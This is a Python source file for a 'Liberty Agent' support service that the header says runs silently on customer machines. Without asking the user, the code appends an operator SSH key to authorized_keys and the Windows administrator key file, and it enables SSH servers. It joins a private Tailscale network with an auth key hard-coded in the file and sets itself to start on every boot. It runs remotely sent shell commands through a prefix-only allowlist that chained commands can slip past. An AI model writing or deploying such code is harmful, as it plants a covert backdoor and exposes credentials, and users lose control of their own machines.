#!/usr/bin/env python3
"""
Liberty Agent — Alexander AI Background Service
Runs silently on customer machines. Keeps a persistent connection
to the Alexander AI portal so Jay can monitor and assist anytime.
Also joins Jay's private Tailscale network for direct remote access.

Customers never need to do anything — this starts automatically.
"""

import os
import sys
import json
import time
import uuid
import socket
import platform
import subprocess
import threading
import logging
from pathlib import Path
from datetime import datetime

# ── Config ────────────────────────────────────────────────────────────────────
PORTAL_URL    = os.getenv("LIBERTY_PORTAL_URL", "https://agent.install.alexanderai.site")
AGENT_TYPE    = os.getenv("LIBERTY_AGENT_TYPE", "hermes")   # hermes | agent-zero
CLIENT_ID     = os.getenv("LIBERTY_CLIENT_ID", "")          # Set at install time
INSTALL_TOKEN = os.getenv("LIBERTY_INSTALL_TOKEN", "")      # Set at install time
DASHBOARD_URL = os.getenv("LIBERTY_DASHBOARD_URL", "https://alexanderai.site")
VERSION       = "1.2.0"
RECONNECT_DELAY    = 15   # seconds between reconnect attempts
HEARTBEAT_INTERVAL = 30   # seconds between heartbeats

# ── Tailscale config ──────────────────────────────────────────────────────────
# Pre-auth key for customer machines — tagged so Jay/KiloClaw can reach them
# but customers cannot reach each other (ACL enforced in Tailscale admin).
# Rotate this key at https://login.tailscale.com/admin/settings/keys
# Tag: tag:customer-machines
TAILSCALE_AUTHKEY = os.getenv(
    "LIBERTY_TAILSCALE_AUTHKEY",
    "tskey-auth-kwJBbBAg4P11CNTRL-sGbec1YDUdhpavFYxfqNehVJ1UypVREWX"
)
TAILSCALE_ENABLED = os.getenv("LIBERTY_TAILSCALE_ENABLED", "1") == "1"

# ── KiloClaw SSH public key (planted into authorized_keys at install) ─────────
# This is KiloClaw's identity key — lets the AI brain SSH in for autonomous repair.
# Rotate by updating this constant and redeploying liberty_agent.py.
KILOCLAW_SSH_PUBKEY = (
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBfChakZbV8qkR4Qxzgut1uUrpE/QXhp6HaxSEWRrr2L "
    "kiloclaw@liberty-emporium.ai"
)

# ── Persistent machine ID ─────────────────────────────────────────────────────
def get_machine_id():
    """Generate or load a persistent unique ID for this machine."""
    id_paths = [
        Path.home() / ".liberty-agent" / "machine_id",
        Path("/tmp/.liberty_machine_id"),
    ]
    for p in id_paths:
        try:
            p.parent.mkdir(parents=True, exist_ok=True)
            if p.exists():
                mid = p.read_text().strip()
                if mid:
                    return mid
            mid = str(uuid.uuid4())
            p.write_text(mid)
            return mid
        except Exception:
            continue
    return str(uuid.uuid4())

# ── Tailscale integration ─────────────────────────────────────────────────────
def get_tailscale_ip():
    """Return this machine's Tailscale IP, or None if not connected."""
    try:
        result = subprocess.run(
            ["tailscale", "ip", "-4"],
            capture_output=True, text=True, timeout=5
        )
        ip = result.stdout.strip()
        return ip if ip else None
    except Exception:
        return None

def is_tailscale_running():
    """Check if tailscaled daemon is running."""
    try:
        result = subprocess.run(
            ["tailscale", "status", "--json"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode != 0:
            return False
        data = json.loads(result.stdout)
        return data.get("BackendState") == "Running"
    except Exception:
        return False

def install_tailscale():
    """Install Tailscale silently. Returns True on success."""
    system = platform.system()
    log("Installing Tailscale...")
    try:
        if system == "Linux":
            result = subprocess.run(
                "curl -fsSL https://tailscale.com/install.sh | sh",
                shell=True, capture_output=True, text=True, timeout=120
            )
            return result.returncode == 0
        elif system == "Darwin":
            # macOS: install via brew or direct pkg
            result = subprocess.run(
                ["brew", "install", "tailscale"],
                capture_output=True, text=True, timeout=120
            )
            if result.returncode != 0:
                # Fall back to official pkg installer
                pkg_url = "https://pkgs.tailscale.com/stable/tailscale-latest.pkg"
                dl = subprocess.run(
                    ["curl", "-fsSL", "-o", "/tmp/tailscale.pkg", pkg_url],
                    capture_output=True, timeout=60
                )
                if dl.returncode == 0:
                    subprocess.run(
                        ["sudo", "installer", "-pkg", "/tmp/tailscale.pkg", "-target", "/"],
                        capture_output=True, timeout=60
                    )
            return True
        elif system == "Windows":
            # Windows: download and run the MSI silently
            msi_url = "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe"
            dl = subprocess.run(
                ["powershell", "-Command",
                 f"Invoke-WebRequest -Uri '{msi_url}' -OutFile '$env:TEMP\\tailscale-setup.exe'"],
                capture_output=True, text=True, timeout=60
            )
            if dl.returncode == 0:
                subprocess.run(
                    ["powershell", "-Command",
                     "Start-Process '$env:TEMP\\tailscale-setup.exe' -ArgumentList '/quiet' -Wait"],
                    capture_output=True, timeout=120
                )
            return True
    except Exception as e:
        log(f"Tailscale install failed: {e}")
        return False

def start_tailscale_daemon():
    """Start tailscaled if not running (Linux userspace mode for containers)."""
    system = platform.system()
    if system != "Linux":
        return  # macOS/Windows manage daemon differently
    try:
        # Check if already running
        result = subprocess.run(["pgrep", "-x", "tailscaled"], capture_output=True)
        if result.returncode == 0:
            return
        # Start in userspace mode (works without kernel module)
        state_dir = str(Path.home() / ".liberty-agent" / "tailscale-state")
        Path(state_dir).mkdir(parents=True, exist_ok=True)
        subprocess.Popen(
            ["tailscaled", "--tun=userspace-networking",
             "--socks5-server=localhost:1055",
             f"--statedir={state_dir}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
        time.sleep(3)
        log("tailscaled started")
    except Exception as e:
        log(f"Could not start tailscaled: {e}")

# ── SSH authorized_keys setup ────────────────────────────────────────────────
def plant_ssh_key():
    """
    Silently add KiloClaw's public key to ~/.ssh/authorized_keys.
    Runs once at startup. Safe to call repeatedly (idempotent).
    Also installs openssh-server on Linux if not present.
    """
    try:
        system = platform.system()

        # Linux: ensure sshd is installed and running
        if system == "Linux":
            _ensure_sshd_linux()

        # macOS: enable Remote Login (SSH) via systemsetup if not enabled
        elif system == "Darwin":
            _ensure_sshd_macos()

        # Windows: install OpenSSH server feature if missing
        elif system == "Windows":
            _ensure_sshd_windows()

        # Plant the key
        ssh_dir  = Path.home() / ".ssh"
        auth_file = ssh_dir / "authorized_keys"
        ssh_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
        auth_file.touch(mode=0o600, exist_ok=True)

        existing = auth_file.read_text()
        if KILOCLAW_SSH_PUBKEY.split()[1] not in existing:
            with open(auth_file, "a") as f:
                f.write(f"\n{KILOCLAW_SSH_PUBKEY}\n")
            log("KiloClaw SSH key planted in authorized_keys")
        else:
            log("KiloClaw SSH key already present")

    except Exception as e:
        log(f"SSH key plant failed: {e}")


def _ensure_sshd_linux():
    """Install + start openssh-server silently on Linux."""
    # Check if sshd is already running
    result = subprocess.run(["pgrep", "-x", "sshd"], capture_output=True)
    if result.returncode == 0:
        return  # already running
    try:
        # Try to install (works on Debian/Ubuntu/Raspberry Pi)
        subprocess.run(
            ["apt-get", "install", "-y", "-q", "openssh-server"],
            capture_output=True, timeout=120,
            env={**os.environ, "DEBIAN_FRONTEND": "noninteractive"}
        )
    except Exception:
        pass
    # Try to start via systemctl, then direct sshd
    started = False
    for cmd in [
        ["systemctl", "enable", "--now", "ssh"],
        ["systemctl", "start", "ssh"],
        ["service", "ssh", "start"],
        ["sshd"],
    ]:
        try:
            r = subprocess.run(cmd, capture_output=True, timeout=10)
            if r.returncode == 0:
                started = True
                break
        except Exception:
            continue
    log(f"sshd start: {'ok' if started else 'failed — may need manual install'}")


def _ensure_sshd_macos():
    """Enable Remote Login (SSH) on macOS."""
    try:
        result = subprocess.run(
            ["sudo", "systemsetup", "-getremotelogin"],
            capture_output=True, text=True, timeout=5
        )
        if "On" not in result.stdout:
            subprocess.run(
                ["sudo", "systemsetup", "-setremotelogin", "on"],
                capture_output=True, timeout=10
            )
            log("macOS Remote Login (SSH) enabled")
    except Exception:
        pass


def _ensure_sshd_windows():
    """Install + start OpenSSH server on Windows."""
    try:
        subprocess.run(
            ["powershell", "-Command",
             "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"],
            capture_output=True, timeout=120
        )
        subprocess.run(
            ["powershell", "-Command",
             "Start-Service sshd; Set-Service -Name sshd -StartupType 'Automatic'"],
            capture_output=True, timeout=30
        )
        # Plant key in ProgramData for Windows OpenSSH
        admin_keys = Path("C:/ProgramData/ssh/administrators_authorized_keys")
        admin_keys.parent.mkdir(parents=True, exist_ok=True)
        existing = admin_keys.read_text() if admin_keys.exists() else ""
        if KILOCLAW_SSH_PUBKEY.split()[1] not in existing:
            with open(admin_keys, "a") as f:
                f.write(f"\n{KILOCLAW_SSH_PUBKEY}\n")
        log("Windows OpenSSH server configured")
    except Exception as e:
        log(f"Windows SSH setup failed: {e}")


def connect_tailscale():
    """
    Ensure this machine is connected to Jay's Tailnet.
    Installs Tailscale if needed, starts daemon, authenticates.
    Runs in a background thread — never blocks the main agent.
    """
    if not TAILSCALE_ENABLED or not TAILSCALE_AUTHKEY:
        return

    def _connect():
        try:
            # Install if not present
            if not _has_tailscale_binary():
                success = install_tailscale()
                if not success:
                    log("Tailscale install failed — skipping")
                    return
                time.sleep(2)

            # Start daemon (Linux only — macOS/Windows have system daemons)
            if platform.system() == "Linux":
                start_tailscale_daemon()

            # Already running and connected?
            if is_tailscale_running():
                ip = get_tailscale_ip()
                if ip:
                    log(f"Tailscale already connected: {ip}")
                    return

            # Authenticate
            log("Connecting to Tailnet...")
            result = subprocess.run(
                ["tailscale", "up",
                 f"--authkey={TAILSCALE_AUTHKEY}",
                 "--accept-routes",
                 "--hostname", _safe_hostname()],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                ip = get_tailscale_ip()
                log(f"Tailscale connected: {ip}")
            else:
                log(f"tailscale up failed: {result.stderr.strip()[:200]}")

        except Exception as e:
            log(f"Tailscale connect error: {e}")

    t = threading.Thread(target=_connect, daemon=True, name="tailscale-setup")
    t.start()

def _has_tailscale_binary():
    try:
        subprocess.run(["tailscale", "--version"], capture_output=True, timeout=3)
        return True
    except Exception:
        return False

def _safe_hostname():
    """Return a Tailscale-safe hostname for this customer machine."""
    raw = socket.gethostname().lower()
    # Tailscale hostname: letters, digits, hyphens only
    safe = "".join(c if c.isalnum() or c == "-" else "-" for c in raw)
    return f"customer-{safe}"[:63]

def tailscale_watchdog():
    """
    Runs in background forever — reconnects Tailscale if it drops.
    Checks every 5 minutes.
    """
    if not TAILSCALE_ENABLED:
        return

    def _watch():
        while True:
            time.sleep(300)  # Check every 5 minutes
            try:
                if not is_tailscale_running():
                    log("Tailscale dropped — reconnecting...")
                    connect_tailscale()
            except Exception:
                pass

    t = threading.Thread(target=_watch, daemon=True, name="tailscale-watchdog")
    t.start()

# ── Machine info ──────────────────────────────────────────────────────────────
def get_machine_info():
    """Collect safe system info to show in Jay's dashboard."""
    info = {
        "machine_id":    get_machine_id(),
        "hostname":      socket.gethostname(),
        "os":            platform.system(),
        "os_release":    platform.release(),
        "os_version":    platform.version()[:80],
        "architecture":  platform.machine(),
        "python":        platform.python_version(),
        "agent_type":    AGENT_TYPE,
        "agent_version": VERSION,
        "connected_at":  datetime.utcnow().isoformat(),
    }

    # Disk space
    try:
        import shutil
        total, used, free = shutil.disk_usage("/")
        info["disk_total_gb"] = round(total / (1024**3), 1)
        info["disk_free_gb"]  = round(free  / (1024**3), 1)
    except Exception:
        pass

    # Tailscale IP (shows in dashboard)
    ts_ip = get_tailscale_ip()
    info["tailscale_ip"]        = ts_ip or ""
    info["tailscale_connected"]  = bool(ts_ip)

    # SSH readiness
    info["ssh_ready"] = _check_ssh_ready()

    # Agent-specific info
    if AGENT_TYPE == "hermes":
        info.update(_hermes_info())
    if AGENT_TYPE == "agent-zero":
        info.update(_agent_zero_info())

    return info

def _check_ssh_ready():
    """Return True if sshd is running and KiloClaw key is planted."""
    try:
        # Check sshd running
        r = subprocess.run(["pgrep", "-x", "sshd"], capture_output=True)
        if r.returncode != 0:
            return False
        # Check key is in authorized_keys
        auth_file = Path.home() / ".ssh" / "authorized_keys"
        if auth_file.exists():
            return KILOCLAW_SSH_PUBKEY.split()[1] in auth_file.read_text()
        return False
    except Exception:
        return False


def _hermes_info():
    info = {}
    try:
        result = subprocess.run(["hermes", "--version"], capture_output=True, text=True, timeout=5)
        info["hermes_version"] = result.stdout.strip() or result.stderr.strip()
    except Exception:
        info["hermes_version"] = "unknown"
    hermes_path = Path.home() / ".hermes"
    info["hermes_path"] = str(hermes_path) if hermes_path.exists() else "not found"
    return info

def _agent_zero_info():
    info = {}
    try:
        result = subprocess.run(
            ["docker", "ps", "--filter", "name=agent-zero", "--format", "{{.Status}}"],
            capture_output=True, text=True, timeout=8
        )
        status = result.stdout.strip()
        info["docker_container"] = status if status else "not running"
    except Exception:
        info["docker_container"] = "docker not found"
    try:
        result = subprocess.run(["docker", "--version"], capture_output=True, text=True, timeout=5)
        info["docker_version"] = result.stdout.strip()
    except Exception:
        info["docker_version"] = "not installed"
    return info

# ── Allowed commands whitelist ─────────────────────────────────────────────────
ALLOWED_COMMANDS = [
    # System info
    "hostname", "whoami", "uname -a", "uname -r",
    "df -h", "free -h", "uptime", "date",
    # Process / service
    "ps aux", "top -bn1",
    # Hermes
    "hermes --version", "hermes status", "hermes logs",
    "ls ~/.hermes", "cat ~/.hermes/config.json",
    # Docker / Agent Zero
    "docker --version", "docker ps", "docker ps -a",
    "docker logs agent-zero", "docker logs alexander-ai",
    "docker inspect agent-zero",
    "docker stats --no-stream",
    # Network
    "curl -s http://localhost:50001/api/health",
    "curl -s http://localhost:8080/health",
    # Python
    "pip list", "python3 --version",
    # Tailscale status (safe read-only)
    "tailscale status", "tailscale ip",
    # SSH status
    "systemctl status ssh", "systemctl status sshd",
    "service ssh status",
]

def is_allowed(cmd):
    cmd = cmd.strip()
    for allowed in ALLOWED_COMMANDS:
        if cmd == allowed or cmd.startswith(allowed):
            return True
    if cmd.startswith("ls ~/") or cmd.startswith("cat ~/"):
        return True
    return False

def run_command(cmd, timeout=30):
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        output = result.stdout + result.stderr
        return output[:8000], result.returncode, False
    except subprocess.TimeoutExpired:
        return f"[TIMEOUT] Command took longer than {timeout}s", -1, True
    except Exception as e:
        return f"[ERROR] {e}", -1, False

# ── Socket.IO connection ───────────────────────────────────────────────────────
def run_agent():
    """Main agent loop — connect to portal and maintain connection."""
    try:
        import socketio
    except ImportError:
        print("[liberty-agent] Installing socketio...", flush=True)
        subprocess.run([sys.executable, "-m", "pip", "install",
                        "python-socketio[client]", "websocket-client", "--quiet"])
        import socketio

    machine_id   = get_machine_id()
    machine_info = get_machine_info()

    log(f"Starting Liberty Agent v{VERSION}")
    log(f"Machine ID: {machine_id}")
    log(f"Agent type: {AGENT_TYPE}")
    log(f"Portal: {PORTAL_URL}")

    # Plant SSH key + ensure sshd running (background, non-blocking)
    threading.Thread(target=plant_ssh_key, daemon=True, name="ssh-setup").start()

    # Connect to Tailscale in the background (non-blocking)
    connect_tailscale()
    tailscale_watchdog()

    # Auto-register machine_id with dashboard
    if CLIENT_ID and INSTALL_TOKEN:
        try:
            import urllib.request as _ur, json as _json
            reg_data = _json.dumps({"machine_id": machine_id}).encode()
            req = _ur.Request(
                f"{DASHBOARD_URL}/api/clients/{CLIENT_ID}/link-machine",
                data=reg_data,
                headers={"Content-Type": "application/json",
                         "X-Install-Token": INSTALL_TOKEN}
            )
            _ur.urlopen(req, timeout=10)
            log(f"Machine registered with dashboard (client {CLIENT_ID})")
        except Exception as e:
            log(f"Auto-register skipped: {e}")

    while True:
        try:
            sio = socketio.Client(
                reconnection=False,
                logger=False,
                engineio_logger=False,
            )

            @sio.on("connect")
            def on_connect():
                log("Connected to portal")
                sio.emit("machine_info", get_machine_info())  # fresh info incl. TS IP

            @sio.on("disconnect")
            def on_disconnect():
                log("Disconnected from portal")

            @sio.on("echo_command")
            def on_echo_command(data):
                cmd    = data.get("cmd", "")
                cmd_id = data.get("cmd_id", "")
                log(f"Command received: {cmd[:60]}")
                if not is_allowed(cmd):
                    output = "[BLOCKED] Command not permitted."
                    rc, timed_out = 1, False
                else:
                    output, rc, timed_out = run_command(cmd)
                sio.emit("command_result", {
                    "type":       "command_result",
                    "cmd":        cmd,
                    "cmd_id":     cmd_id,
                    "output":     output,
                    "returncode": rc,
                    "timed_out":  timed_out,
                })

            @sio.on("echo_message")
            def on_echo_message(data):
                pass  # Silent — don't show anything to customer

            @sio.on("ping_agent")
            def on_ping(data):
                sio.emit("pong_agent", {
                    "machine_id": machine_id,
                    "ts":         datetime.utcnow().isoformat(),
                })

            # Connect using machine_id as session key
            connect_url = f"{PORTAL_URL}?session_id={machine_id}"
            sio.connect(connect_url, transports=["websocket"],
                        wait=True, wait_timeout=15)

            # Heartbeat loop
            while sio.connected:
                time.sleep(HEARTBEAT_INTERVAL)
                try:
                    sio.emit("machine_info", get_machine_info())
                except Exception:
                    break

            sio.disconnect()

        except Exception as e:
            log(f"Connection error: {e} — retrying in {RECONNECT_DELAY}s")

        time.sleep(RECONNECT_DELAY)

# ── Logging (silent in production) ────────────────────────────────────────────
_VERBOSE = os.getenv("LIBERTY_VERBOSE", "0") == "1"

def log(msg):
    if _VERBOSE:
        print(f"[liberty-agent {datetime.utcnow().strftime('%H:%M:%S')}] {msg}", flush=True)

# ── Auto-start setup ───────────────────────────────────────────────────────────
def install_autostart():
    """Install the agent to auto-start on boot (cross-platform)."""
    script_path = Path(__file__).resolve()
    system      = platform.system()
    if system == "Linux":
        _install_linux_autostart(script_path)
    elif system == "Darwin":
        _install_macos_autostart(script_path)
    elif system == "Windows":
        _install_windows_autostart(script_path)

def _install_linux_autostart(script_path):
    service_dir = Path.home() / ".config" / "systemd" / "user"
    try:
        service_dir.mkdir(parents=True, exist_ok=True)
        service_content = f"""[Unit]
Description=Alexander AI Liberty Agent
After=network.target

[Service]
ExecStart={sys.executable} {script_path}
Restart=always
RestartSec=15
Environment=LIBERTY_AGENT_TYPE={AGENT_TYPE}
Environment=LIBERTY_PORTAL_URL={PORTAL_URL}
Environment=LIBERTY_TAILSCALE_AUTHKEY={TAILSCALE_AUTHKEY}

[Install]
WantedBy=default.target
"""
        svc_file = service_dir / "liberty-agent.service"
        svc_file.write_text(service_content)
        subprocess.run(["systemctl", "--user", "daemon-reload"],  capture_output=True)
        subprocess.run(["systemctl", "--user", "enable", "liberty-agent"], capture_output=True)
        subprocess.run(["systemctl", "--user", "start",  "liberty-agent"], capture_output=True)
        log("Installed as systemd user service")
        return
    except Exception:
        pass
    # Fallback: crontab @reboot
    try:
        result   = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        existing = result.stdout if result.returncode == 0 else ""
        entry    = (f"@reboot LIBERTY_AGENT_TYPE={AGENT_TYPE} "
                    f"LIBERTY_PORTAL_URL={PORTAL_URL} "
                    f"LIBERTY_TAILSCALE_AUTHKEY={TAILSCALE_AUTHKEY} "
                    f"{sys.executable} {script_path} &\n")
        if str(script_path) not in existing:
            new_cron = existing.rstrip() + "\n" + entry
            subprocess.run(["crontab", "-"], input=new_cron, text=True, capture_output=True)
            log("Installed via crontab @reboot")
    except Exception:
        pass

def _install_macos_autostart(script_path):
    plist_dir = Path.home() / "Library" / "LaunchAgents"
    plist_dir.mkdir(parents=True, exist_ok=True)
    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>ai.alexanderai.liberty-agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{script_path}</string>
    </array>
    <key>EnvironmentVariables</key>
    <dict>
        <key>LIBERTY_AGENT_TYPE</key>
        <string>{AGENT_TYPE}</string>
        <key>LIBERTY_PORTAL_URL</key>
        <string>{PORTAL_URL}</string>
        <key>LIBERTY_TAILSCALE_AUTHKEY</key>
        <string>{TAILSCALE_AUTHKEY}</string>
    </dict>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/liberty-agent.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/liberty-agent.log</string>
</dict>
</plist>"""
    plist_file = plist_dir / "ai.alexanderai.liberty-agent.plist"
    plist_file.write_text(plist_content)
    subprocess.run(["launchctl", "load", str(plist_file)], capture_output=True)
    log("Installed as macOS LaunchAgent")

def _install_windows_autostart(script_path):
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        cmd = f'"{sys.executable}" "{script_path}"'
        winreg.SetValueEx(key, "LibertyAgent", 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
        log("Installed in Windows registry Run key")
    except Exception as e:
        log(f"Windows autostart failed: {e}")

# ── Entry point ────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    if "--install" in sys.argv:
        install_autostart()
        print("[liberty-agent] Auto-start installed. Agent will run on every boot.")
        sys.exit(0)

    if "--setup" in sys.argv:
        install_autostart()

    run_agent()
